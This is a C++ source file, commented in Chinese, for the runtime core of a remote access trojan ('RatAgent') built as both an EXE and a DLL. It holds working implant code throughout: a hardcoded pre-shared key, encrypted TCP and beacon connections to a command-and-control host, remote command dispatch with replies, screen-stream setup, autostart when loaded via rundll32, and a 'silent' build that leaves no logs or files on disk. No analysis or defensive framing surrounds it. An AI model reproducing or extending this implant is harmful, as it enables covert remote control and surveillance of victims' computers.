// agent_runtime.cpp — Agent 运行核心实现（EXE 与 DLL 共用）
#include "agent_runtime.h"
#include "agent_debug.h"
#include "module_id.h"

#include "beacon.h"
#include "cmd_dispatch.h"
#include "crypto.h"
#include "net.h"
#include "protocol.h"
#include "screen_stream.h"
#include "session.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <bcrypt.h>

#include <atomic>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <process.h>
#include <string>
#include <vector>

#ifdef RAT_AGENT_DLL
#define RAT_AGENT_FLAVOR "dll"
#else
#define RAT_AGENT_FLAVOR "exe"
#endif

namespace c2
{

    namespace
    {

        // 预共享密钥（与 c2server/ratctl 一致，编译期内置；生产应外部化）
        const char kPskHex[] =
            "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20";

        std::atomic<bool> g_stop{ false };          // 进程内停止标志
        std::atomic<bool> g_running{ false };       // 工作线程存活
        std::atomic<uintptr_t> g_sock{ (uintptr_t)~0ull }; // 当前活动 socket（INVALID_SOCKET）
        std::atomic<int> g_mode{ 0 };               // 0=stopped 1=beacon 2=tcp
        HANDLE g_thread = nullptr;
        HANDLE g_stop_event = nullptr;              // 跨进程停止事件（Local\RatAgentStop.<id>）
        std::string g_stop_event_name;
        std::string g_id_hex;
        AgentRunArgs g_args;
        std::mutex g_mx;

        // ---- 路径/编码辅助 ----

        std::wstring utf8_to_wide(const std::string& s)
        {
            if (s.empty())
                return std::wstring();
            int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
            if (n <= 0)
                return std::wstring();
            std::wstring w((size_t)n, 0);
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
            return w;
        }

        std::string wide_to_utf8(const std::wstring& w)
        {
            if (w.empty())
                return std::string();
            int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                nullptr, 0, nullptr, nullptr);
            if (n <= 0)
                return std::string();
            std::string s((size_t)n, 0);
            WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n,
                nullptr, nullptr);
            return s;
        }

        std::wstring env_wide(const wchar_t* name)
        {
            wchar_t buf[MAX_PATH * 2] = { 0 };
            DWORD n = GetEnvironmentVariableW(name, buf, (DWORD)(sizeof(buf) / sizeof(buf[0])));
            if (n == 0 || n >= sizeof(buf) / sizeof(buf[0]))
                return std::wstring();
            return std::wstring(buf, n);
        }

        // %LOCALAPPDATA%\RatAgent（回退 %TEMP%\RatAgent）
        std::wstring agent_dir_wide()
        {
            std::wstring base = env_wide(L"LOCALAPPDATA");
            if (base.empty())
                base = env_wide(L"TEMP");
            if (base.empty())
                base = L".";
            if (!base.empty() && base[base.size() - 1] != L'\\')
                base += L'\\';
            base += L"RatAgent";
            return base;
        }

        void ensure_dir(const std::wstring& dir)
        {
            CreateDirectoryW(dir.c_str(), nullptr); // 已存在则失败，忽略
        }

        std::string hex_of(const uint8_t* p, size_t n)
        {
            static const char* kHex = "0123456789abcdef";
            std::string s;
            s.reserve(n * 2);
            for (size_t i = 0; i < n; ++i)
            {
                s.push_back(kHex[p[i] >> 4]);
                s.push_back(kHex[p[i] & 0xF]);
            }
            return s;
        }

        // agent_id：读不到就随机生成（是否落盘由 RAT_AGENT_PERSIST_ID 决定）
        void load_or_create_agent_id(const std::string& path, uint8_t out[kAgentIdLen])
        {
#if RAT_AGENT_PERSIST_ID
            std::wstring wpath = utf8_to_wide(path);
            HANDLE f = CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (f != INVALID_HANDLE_VALUE)
            {
                DWORD got = 0;
                uint8_t buf[kAgentIdLen] = { 0 };
                BOOL ok = ReadFile(f, buf, kAgentIdLen, &got, nullptr);
                CloseHandle(f);
                if (ok && got == kAgentIdLen)
                {
                    std::memcpy(out, buf, kAgentIdLen);
                    return;
                }
            }
            BCryptGenRandom(nullptr, out, kAgentIdLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            f = CreateFileW(wpath.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (f != INVALID_HANDLE_VALUE)
            {
                DWORD written = 0;
                WriteFile(f, out, kAgentIdLen, &written, nullptr);
                CloseHandle(f);
            }
#else
            // 静默构建（RAT_AGENT_PERSIST_ID=0）：身份只在内存里，磁盘零写入。
            // 代价：重启后 id 变化；另一进程无法凭 id 文件停止它（可按已知 hex 触发事件）
            (void)path;
            BCryptGenRandom(nullptr, out, kAgentIdLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
#endif
        }

        // 进程内唯一身份：一次进程只读/生成一次并缓存。
        // 必要性：静默构建下 id 不落盘，若不缓存，agent_start（拿它命名停止事件）与
        // worker（拿它上报 cookie）会各自随机出一个 id，导致"服务器看到的 id"与
        // "停止事件名里的 id"对不上。落盘构建下这样做也省掉一次重复读文件。
        void agent_ensure_id(const std::string& path, uint8_t out[kAgentIdLen])
        {
            static uint8_t cached[kAgentIdLen] = { 0 };
            static bool ready = false;
            if (!ready)
            {
                load_or_create_agent_id(path, cached);
                ready = true;
            }
            std::memcpy(out, cached, kAgentIdLen);
        }

        AgentConfig build_config(const AgentRunArgs& a, const uint8_t agent_id[kAgentIdLen])
        {
            AgentConfig cfg;
            cfg.host = a.host;
            cfg.port = a.port;
            cfg.psk.resize(32);
            for (size_t i = 0; i < 32; ++i)
            {
                char b[3] = { kPskHex[i * 2], kPskHex[i * 2 + 1], 0 };
                cfg.psk[i] = (uint8_t)strtol(b, nullptr, 16);
            }
            std::memcpy(cfg.agent_id, agent_id, kAgentIdLen);
            // 模块标签：让 C2 侧一眼看出"这台机器的哪个模块"（服务端存入 OSInfo 并打印）
            cfg.os_info = std::string("Windows (") + kModuleId + ")";
            // 能力位：走已有的 plugins 位图链路（HELLO/心跳 → 服务端 → ratctl）
            cfg.plugins_bitmap = kModuleCaps;
            return cfg;
        }

        // ---- TCP 长连接模式（原 main.cpp run_agent，改为可停止）----

        int tcp_worker(const AgentRunArgs& a)
        {
            uint8_t agent_id[kAgentIdLen] = { 0 };
            agent_ensure_id(a.id_path, agent_id);
            g_id_hex = hex_of(agent_id, kAgentIdLen);
            AgentConfig cfg = build_config(a, agent_id);
            screen_stream_set_config(a.host, cfg);

            int delay = 1;
            while (!agent_stop_requested())
            {
                AGENT_LOG("[*] connecting to %s:%u...\n", a.host.c_str(), (unsigned)a.port);
                Session s;
                std::string err;

                if (!session_handshake(s, cfg, err))
                {
                    AGENT_LOG("[-] handshake failed: %s\n", err.c_str());
                }
                else
                {
                    AGENT_LOG("[+] connected, session key derived\n");
                    delay = 1;
                    g_sock.store((uintptr_t)s.sock);

                    std::atomic<bool> running{ true };
                    HeartbeatCtx hctx{ &s, &cfg, &running };
                    HANDLE ht = (HANDLE)_beginthreadex(nullptr, 0, heartbeat_proc, &hctx, 0, nullptr);

                    Header h;
                    std::vector<uint8_t> payload;
                    uint32_t last_seq = 0;
                    while (!agent_stop_requested() &&
                        net_read_packet(s.sock, h, payload, -1))
                    {
                        if (!(h.flags & kFlagEncrypted))
                            continue;
                        std::vector<uint8_t> plain;
                        std::string derr;
                        if (!aes_gcm_decrypt(s.key.data(), s.key.size(),
                            payload.data(), payload.size(), plain, derr))
                            continue;
                        if (h.seq <= last_seq)
                        {
                            AGENT_LOG("[recv] DROP replay/out-of-order cmd=0x%04x seq=%u (last=%u)\n",
                                h.cmd, h.seq, last_seq);
                            continue;
                        }
                        last_seq = h.seq;
                        AGENT_LOG("[recv] cmd=0x%04x seq=%u len=%zu\n", h.cmd, h.seq, plain.size());

                        if (h.cmd == kCmdBye)
                            break;

                        uint8_t status = 0;
                        std::vector<uint8_t> resp;
                        size_t arg_off = 0;
                        // 未知指令也回 CMD_RESULT（status=kStatusUnknownCmd，见协议 §2/§3.2）：
                        // 与 beacon 信道行为一致，避免 ctl 空等到 240s 超时
                        handle_command(h.cmd, plain.data() + arg_off,
                            plain.size() - arg_off, resp, status);

                        std::vector<uint8_t> out;
                        uint32_t req = h.seq;
                        for (int i = 0; i < 4; ++i)
                            out.push_back((uint8_t)(req >> (8 * i)));
                        out.push_back(status);
                        out.insert(out.end(), resp.begin(), resp.end());

                        std::vector<uint8_t> sealed;
                        if (!aes_gcm_encrypt(s.key.data(), s.key.size(),
                            out.data(), out.size(), sealed, err))
                            continue;
                        Header rh;
                        rh.flags = kFlagEncrypted;
                        rh.seq = h.seq; // 回显请求 seq（C2 靠它查 relay）
                        rh.cmd = kCmdResult;
                        rh.plugin = h.plugin;
                        rh.timestamp = (uint32_t)GetTickCount64();
                        if (!net_write_packet(s.sock, rh, sealed.data(), sealed.size()))
                            break;
                    }

                    AGENT_LOG("[-] connection lost, reconnecting...\n");
                    running.store(false);
                    if (ht)
                    {
                        WaitForSingleObject(ht, 3000);
                        CloseHandle(ht);
                    }
                    net_close(s.sock);
                    g_sock.store((uintptr_t)~0ull);
                }

                if (agent_stop_requested())
                    break;
                agent_sleep(delay * 1000);
                if (delay < 60)
                    delay *= 2; // 1s→2s→4s→…→60s
            }
            return 0;
        }

        // ---- beacon 模式 ----

        int beacon_worker(const AgentRunArgs& a)
        {
            uint8_t agent_id[kAgentIdLen] = { 0 };
            agent_ensure_id(a.id_path, agent_id);
            g_id_hex = hex_of(agent_id, kAgentIdLen);
            AgentConfig cfg = build_config(a, agent_id);
            // 屏幕流长连接同样需要配置（协议 §9）
            screen_stream_set_config(a.host, cfg);

            // beacon_key = HKDF-SHA256(PSK, agent_id, "rat-beacon-v1")（协议 §8.2）
            std::vector<uint8_t> beacon_key =
                hkdf_sha256(cfg.psk.data(), cfg.psk.size(), agent_id, kAgentIdLen,
                    (const uint8_t*)"rat-beacon-v1", 13, 32);

            run_beacon(a.host, a.port, cfg, beacon_key.data(), a.sleeptime);
            return 0;
        }

        unsigned __stdcall worker_proc(void* param)
        {
            AgentRunArgs* a = static_cast<AgentRunArgs*>(param);
            int rc = a->beacon ? beacon_worker(*a) : tcp_worker(*a);
            AGENT_LOG("[*] agent worker exit (rc=%d)\n", rc);
            g_running.store(false);
            g_mode.store(0);
            return 0;
        }

        // 停止事件名：Local\RatAgentStop.<agent_id_hex>
        // 用 agent_id 作为名字，使"另一个进程"能凭同一个 agent.id 推算出名字来发停止信号
        void open_stop_event(const uint8_t agent_id[kAgentIdLen])
        {
            g_stop_event_name = "Local\\RatAgentStop." + hex_of(agent_id, kAgentIdLen);
            std::wstring wname = utf8_to_wide(g_stop_event_name);
            g_stop_event = CreateEventW(nullptr, TRUE, FALSE, wname.c_str());
            if (!g_stop_event)
                AGENT_LOG("[!] create stop event failed (err=%lu)\n", GetLastError());
        }

    } // namespace

    void agent_sleep(int total_ms)
    {
        const int slice = 200;
        for (int slept = 0; slept < total_ms; slept += slice)
        {
            if (agent_stop_requested())
                return;
            int remain = total_ms - slept;
            Sleep((DWORD)(remain > slice ? slice : remain));
        }
    }

    // ---- 参数解析 ----

    bool agent_parse_args(const std::string& s, AgentRunArgs& out, std::string& err)
    {
        std::vector<std::string> tok;
        std::string cur;
        for (char c : s)
        {
            if (c == ' ' || c == '\t' || c == ',' || c == ';')
            {
                if (!cur.empty()) { tok.push_back(cur); cur.clear(); }
            }
            else
            {
                cur.push_back(c);
            }
        }
        if (!cur.empty())
            tok.push_back(cur);

        int positional = 0;
        for (size_t i = 0; i < tok.size(); ++i)
        {
            const std::string& t = tok[i];
            if (t == "-tcp" || t == "--tcp")
            {
                out.beacon = false;
                if (out.port == 8080)
                    out.port = 4444;
            }
            else if (t == "-beacon" || t == "--beacon")
            {
                out.beacon = true;
            }
            else if (t == "-s" || t == "--sleep")
            {
                if (i + 1 >= tok.size())
                {
                    err = "-s 缺少参数";
                    return false;
                }
                int v = std::atoi(tok[++i].c_str());
                out.sleeptime = v > 0 ? v : 1;
            }
            else if (t == "--selftest" || t == "-selftest")
            {
                out.selftest = true;
            }
            else if (t.rfind("id=", 0) == 0)
            {
                out.id_path = t.substr(3);
            }
            else if (t.rfind("log=", 0) == 0)
            {
                out.log_path = t.substr(4);
            }
            else if (t.rfind("-host=", 0) == 0 || t.rfind("host=", 0) == 0)
            {
                out.host = t.substr(t.find('=') + 1);
            }
            else if (t.rfind("-port=", 0) == 0 || t.rfind("port=", 0) == 0)
            {
                out.port = (uint16_t)std::atoi(t.c_str() + t.find('=') + 1);
            }
            else if (!t.empty() && t[0] == '-')
            {
                err = "未知参数: " + t;
                return false;
            }
            else if (positional == 0)
            {
                out.host = t;
                ++positional;
            }
            else if (positional == 1)
            {
                out.port = (uint16_t)std::atoi(t.c_str());
                ++positional;
            }
            // 其余位置参数忽略（rundll32 偶尔会带额外尾巴）
        }
        if (out.host.empty())
        {
            err = "host 为空";
            return false;
        }
        if (out.port == 0)
        {
            err = "port 非法";
            return false;
        }
        return true;
    }

    std::string agent_args_from_argv(int argc, char** argv)
    {
        std::string s;
        for (int i = 1; i < argc; ++i)
        {
            if (i > 1)
                s.push_back(' ');
            s += argv[i];
        }
        return s;
    }

    std::string agent_default_id_path(bool for_dll)
    {
        // 文件名带模块前缀：同机多模块共存时身份互不覆盖（见 module_id.h）
        if (!for_dll)
            return std::string(kModuleId) + ".id"; // EXE：相对 CWD（保留历史行为）
        return wide_to_utf8(agent_dir_wide()) + "\\" + kModuleId + ".id";
    }

    std::string agent_default_log_path()
    {
        return wide_to_utf8(agent_dir_wide()) + "\\" + kModuleId + ".log";
    }

    bool agent_redirect_stdout(const std::string& path)
    {
#if !RAT_AGENT_DEBUG
        // 静默构建：绝不落日志文件（无论谁调用）
        (void)path;
        return false;
#else
        std::wstring logw = utf8_to_wide(path);
        if (logw.empty())
            return false;
        size_t pos = logw.find_last_of(L'\\');
        if (pos != std::wstring::npos)
            ensure_dir(logw.substr(0, pos));
        if (_wfreopen(logw.c_str(), L"a", stdout) == nullptr)
            return false;
        setvbuf(stdout, nullptr, _IONBF, 0);
        return true;
#endif
    }

    // ---- 生命周期 ----

    bool agent_start(const AgentRunArgs& args, std::string& err)
    {
        if (g_running.load())
        {
            err = "already running";
            return false;
        }

        g_args = args;
        if (g_args.id_path.empty())
        {
#ifdef RAT_AGENT_DLL
            g_args.id_path = agent_default_id_path(true);   // DLL：%LOCALAPPDATA%\RatAgent\agent.id
#else
            g_args.id_path = agent_default_id_path(false);  // EXE：CWD 下的 agent.id（历史行为）
#endif
        }
        if (g_args.log_path.empty())
            g_args.log_path = agent_default_log_path();

        // 目录/重定向：只在会落盘/会输出时才碰文件系统与 stdout。
        // 静默构建（RAT_AGENT_DEBUG=0）下不建目录、不放开日志、也不动宿主的 stdout。
#if RAT_AGENT_PERSIST_ID
        {
            std::wstring idw = utf8_to_wide(g_args.id_path);
            size_t pos = idw.find_last_of(L'\\');
            if (pos != std::wstring::npos)
                ensure_dir(idw.substr(0, pos));
        }
#endif
#if RAT_AGENT_DEBUG
        // DLL 被 rundll32 加载时没有控制台，把 stdout 落到文件（可被 log= 覆盖）
        if (g_args.redirect_stdout && GetConsoleWindow() == nullptr)
        {
            if (agent_redirect_stdout(g_args.log_path))
                AGENT_LOG("---- RatAgent/%s log open %s ----\n",
                    RAT_AGENT_FLAVOR, g_args.log_path.c_str());
        }
        else
        {
            setvbuf(stdout, nullptr, _IONBF, 0);
        }
#endif

        // 停止事件（跨进程停止用）
        uint8_t tmp_id[kAgentIdLen] = { 0 };
        agent_ensure_id(g_args.id_path, tmp_id); // 进程内唯一 id（事件名必须与上报 id 一致）
        if (g_stop_event)
        {
            CloseHandle(g_stop_event);
            g_stop_event = nullptr;
        }
        open_stop_event(tmp_id);

        g_stop.store(false);
        g_running.store(true);
        g_mode.store(g_args.beacon ? 1 : 2);
        AGENT_LOG("[*] agent_start mode=%s host=%s:%u sleeptime=%d id_path=%s log=%s\n",
            g_args.beacon ? "beacon" : "tcp", g_args.host.c_str(), (unsigned)g_args.port,
            g_args.sleeptime, g_args.id_path.c_str(), g_args.log_path.c_str());

        g_thread = (HANDLE)_beginthreadex(nullptr, 0, worker_proc, &g_args, 0, nullptr);
        if (!g_thread)
        {
            g_running.store(false);
            g_mode.store(0);
            err = "create worker thread failed";
            return false;
        }
        return true;
    }

    void agent_request_stop()
    {
        g_stop.store(true);
        if (g_stop_event)
            SetEvent(g_stop_event); // 也唤醒 agent_stop_requested() 的检查
        uintptr_t s = g_sock.load();
        if (s != (uintptr_t)~0ull)
            shutdown((SOCKET)s, SD_BOTH); // 打断阻塞的 recv
    }

    bool agent_stop(int timeout_ms)
    {
        agent_request_stop();
        return agent_wait(timeout_ms);
    }

    bool agent_wait(int timeout_ms)
    {
        std::lock_guard<std::mutex> lk(g_mx);
        if (!g_thread)
            return true;
        DWORD w = WaitForSingleObject(g_thread, timeout_ms < 0 ? INFINITE : (DWORD)timeout_ms);
        if (w != WAIT_OBJECT_0)
            return false;
        CloseHandle(g_thread);
        g_thread = nullptr;
        g_running.store(false);
        g_mode.store(0);
        if (g_stop_event)
        {
            CloseHandle(g_stop_event);
            g_stop_event = nullptr;
        }
        return true;
    }

    bool agent_running()
    {
        return g_running.load();
    }

    const char* agent_mode()
    {
        switch (g_mode.load())
        {
        case 1: return "beacon";
        case 2: return "tcp";
        default: return "stopped";
        }
    }

    const char* agent_version()
    {
        return "1.0-" RAT_AGENT_FLAVOR;
    }

    std::string agent_id_hex()
    {
        return g_id_hex;
    }

    // ---- DLL 加载即自启动（见 agent_runtime.h 说明）----

    std::string agent_autostart_path()
    {
        // 文件名带模块前缀：避免同机多模块互相误触发自启（见 module_id.h）
        return wide_to_utf8(agent_dir_wide()) + "\\" + kModuleId + ".autostart.args";
    }

    namespace
    {
        bool read_file_utf8(const std::string& path, std::string& out)
        {
            std::wstring wpath = utf8_to_wide(path);
            HANDLE f = CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (f == INVALID_HANDLE_VALUE)
                return false;
            char buf[1024] = { 0 };
            DWORD got = 0;
            BOOL ok = ReadFile(f, buf, sizeof(buf) - 1, &got, nullptr);
            CloseHandle(f);
            if (!ok)
                return false;
            out.assign(buf, got);
            // 只取第一行，去掉换行/回车
            size_t nl = out.find_first_of("\r\n");
            if (nl != std::string::npos)
                out.resize(nl);
            return true;
        }
    } // namespace

    bool agent_autostart_requested(std::string& args)
    {
        // 依次探测：LOCALAPPDATA\RatAgent\<module>.autostart.args →
        //           %TEMP%\RatAgent\<module>.autostart.args
        std::vector<std::string> cands;
        cands.push_back(agent_autostart_path());
        std::wstring tmp = env_wide(L"TEMP");
        if (!tmp.empty())
        {
            if (tmp[tmp.size() - 1] != L'\\')
                tmp += L'\\';
            tmp += L"RatAgent\\";
            tmp += utf8_to_wide(kModuleId);
            tmp += L".autostart.args";
            cands.push_back(wide_to_utf8(tmp));
        }
        for (const auto& c : cands)
        {
            if (!c.empty() && read_file_utf8(c, args))
            {
                AGENT_LOG("[*] autostart trigger: %s -> args=\"%s\"\n", c.c_str(), args.c_str());
                return true;
            }
        }
        return false;
    }

    bool agent_signal_stop_by_id_hex(const std::string& hex32)
    {
        if (hex32.size() != 32)
            return false;
        for (char c : hex32)
        {
            bool ishex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
                (c >= 'A' && c <= 'F');
            if (!ishex)
                return false;
        }
        std::wstring name = utf8_to_wide("Local\\RatAgentStop." + hex32);
        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, name.c_str());
        if (!ev)
            return false;
        SetEvent(ev);
        CloseHandle(ev);
        return true;
    }

    bool agent_signal_stop_by_id_file(const std::string& id_path)
    {
        std::wstring wpath = utf8_to_wide(id_path);
        HANDLE f = CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (f == INVALID_HANDLE_VALUE)
            return false;
        uint8_t id[kAgentIdLen] = { 0 };
        DWORD got = 0;
        BOOL ok = ReadFile(f, id, kAgentIdLen, &got, nullptr);
        CloseHandle(f);
        if (!ok || got != kAgentIdLen)
            return false;
        std::wstring name = utf8_to_wide("Local\\RatAgentStop." + hex_of(id, kAgentIdLen));
        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, name.c_str());
        if (!ev)
            return false; // 目标未运行（或事件名不存在）
        SetEvent(ev);
        CloseHandle(ev);
        return true;
    }

    bool agent_stop_requested()
    {
        if (g_stop.load())
            return true;
        if (g_stop_event && WaitForSingleObject(g_stop_event, 0) == WAIT_OBJECT_0)
        {
            g_stop.store(true); // 外部（另一进程）触发了停止事件
            return true;
        }
        return false;
    }

    void agent_set_active_socket(uintptr_t s)
    {
        g_sock.store(s);
    }

    uintptr_t agent_active_socket()
    {
        return g_sock.load();
    }

} // namespace c2
